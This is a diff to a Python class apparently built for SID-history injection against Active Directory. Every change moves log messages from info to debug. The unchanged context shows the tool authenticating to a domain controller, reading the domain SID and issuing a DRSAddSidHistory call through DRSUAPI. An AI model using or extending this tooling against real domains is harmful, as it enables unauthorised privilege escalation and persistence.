@@ -37,7 +37,7 @@ class SIDHistoryAttack:
         self._formatter = OutputFormatter()
         self._scanner = None
 
-        logging.info(f"Initialized targeting {dc_ip} ({domain})")
+        logging.debug(f"Initialized targeting {dc_ip} ({domain})")
 
     # ─── CONNECTION MANAGEMENT ────────────────────────────────────────
 
@@ -52,9 +52,9 @@ class SIDHistoryAttack:
             # Try to discover domain SID
             self.domain_sid = self.ldap_ops.get_domain_sid()
             if self.domain_sid:
-                logging.info(f"Domain SID: {self.domain_sid}")
+                logging.debug(f"Domain SID: {self.domain_sid}")
 
-            logging.info(f"Successfully authenticated to {self.dc_ip}")
+            logging.debug(f"Successfully authenticated to {self.dc_ip}")
             return True
         else:
             logging.error("Authentication failed")
@@ -93,7 +93,7 @@ class SIDHistoryAttack:
         )
 
         if success:
-            logging.info("DRSUAPI connection established")
+            logging.debug("DRSUAPI connection established")
         else:
             logging.error("Failed to establish DRSUAPI connection")
             self.drsuapi_client = None
@@ -105,7 +105,7 @@ class SIDHistoryAttack:
         if self.connection:
             try:
                 self.connection.unbind()
-                logging.info("LDAP disconnected")
+                logging.debug("LDAP disconnected")
             except Exception:
                 pass
             finally:
@@ -156,7 +156,7 @@ class SIDHistoryAttack:
             src_creds_password: Password for source domain auth
         """
         if not self.drsuapi_client:
-            logging.info("Establishing DRSUAPI connection...")
+            logging.debug("Establishing DRSUAPI connection...")
             if not self.connect_drsuapi():
                 logging.error("Cannot connect to DRSUAPI")
                 return False
@@ -164,7 +164,7 @@ class SIDHistoryAttack:
         src_domain = source_domain or self.domain
         dst_domain = self.domain
 
-        logging.info(f"DRSAddSidHistory: {source_user}@{src_domain} -> {target_user}@{dst_domain}")
+        logging.debug(f"DRSAddSidHistory: {source_user}@{src_domain} -> {target_user}@{dst_domain}")
 
         success, error_code, error_msg = self.drsuapi_client.add_sid_history(
             src_domain=src_domain,
@@ -177,7 +177,7 @@ class SIDHistoryAttack:
         )
 
         if success:
-            logging.info("DRSAddSidHistory RPC call succeeded!")
+            logging.debug("DRSAddSidHistory RPC call succeeded!")
         else:
             logging.error(f"DRSAddSidHistory failed: {error_msg}")
             self._suggest_drsuapi_fix(error_code)
